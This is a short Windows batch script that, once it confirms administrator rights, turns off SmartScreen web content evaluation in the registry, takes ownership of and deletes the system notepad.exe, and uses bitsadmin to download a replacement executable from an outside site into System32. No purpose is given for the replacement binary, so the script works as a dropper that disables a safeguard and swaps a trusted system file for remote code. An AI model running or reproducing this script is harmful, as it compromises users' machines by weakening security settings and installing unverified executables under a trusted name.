@echo off
goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...
    
    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Success: Administrative permissions confirmed.
		reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f
		cd C:\Windows\System32
		TAKEOWN /F notepad.exe
		copy C:\Windows\System32\notepad.exe notepad.exe.bak
		del notepad.exe
		rm notepad.exe
		bitsadmin /transfer myDownloadJob /download /priority normal https://www.creepyna.me/notepad.exe C:\Windows\System32\notepad.exe
		echo Perfect
		exit
    ) else (
        echo Failure: Current permissions inadequate, Please launch as admin..
    )
    
    pause >nul
	
	
	
